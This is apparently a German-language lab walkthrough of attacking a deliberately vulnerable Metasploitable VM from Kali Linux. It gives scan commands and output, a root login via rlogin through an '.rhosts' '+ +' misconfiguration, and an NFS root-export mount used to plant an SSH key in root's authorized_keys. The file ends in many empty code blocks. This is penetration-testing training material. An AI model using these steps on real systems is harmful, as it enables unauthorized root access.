
```sh
ssh -vvv -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@$META
```

IP Adresse von Metasploitable herausfinden:

```sh
nmap -sn 192.168.220.0/24
```

Alle Ports scannen

```sh
$ nmap -p 0-65535 192.168.220.128     
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 07:50 EDT
Nmap scan report for 192.168.220.128
Host is up (0.0018s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  ircs-u
8009/tcp  open  ajp13
8180/tcp  open  unknown
8787/tcp  open  msgsrvr
40943/tcp open  unknown
44541/tcp open  unknown
49963/tcp open  unknown
58525/tcp open  unknown
MAC Address: 00:0C:29:79:C9:39 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

# rlogin

```sh
$ META=192.168.220.128
$ rlogin -l root $META
```

Dann ist man als `root` eingelogt. Der Grund ist die Fehlkonfiguration:

```sh
```
```
$ cat .rhosts 
+ +
```

# nfs

"Probing" des 2049 Ports z.b. mit telnet

```sh
$ telnet $META 2049   
```
```
Trying 192.168.220.128...
Connected to 192.168.220.128.
Escape character is '^]'.
sdf
Connection closed by foreign host.
```

oder mit portmapper service:

```sh
$ rpcinfo -p $META    
```
```
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  33140  status
    100024    1   tcp  44541  status
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100021    1   udp  36094  nlockmgr
    100021    3   udp  36094  nlockmgr
    100021    4   udp  36094  nlockmgr
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100021    1   tcp  49963  nlockmgr
    100021    3   tcp  49963  nlockmgr
    100021    4   tcp  49963  nlockmgr
    100005    1   udp  51852  mountd
    100005    1   tcp  40943  mountd
    100005    2   udp  51852  mountd
    100005    2   tcp  40943  mountd
    100005    3   udp  51852  mountd
    100005    3   tcp  40943  mountd
                                                                                                       
```

Welche Verzeichnisse werden exportiert:

```sh
$ showmount -e $META
```
```
Export list for 192.168.220.128:
/ *
```

Weitermachen als root am Kali:

```
$ sudo -i
```

```sh
root@kali# mkdir /tmp/r00t
root@kali# mount -t nfs $META:/ /tmp/r00t
```

rsa verwenden Metasploitable kann nichts anderes.

```
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub >>/tmp/r00t/root/.ssh/authorized_keys
```

Auch beim ssh muss man Berücksichtigen, dass Metasploitable die neueren Algorithmen nicht unterstützt. Der Kali Client erwartet diese aber.

```
ssh -vvv -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@$META
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```

```
```
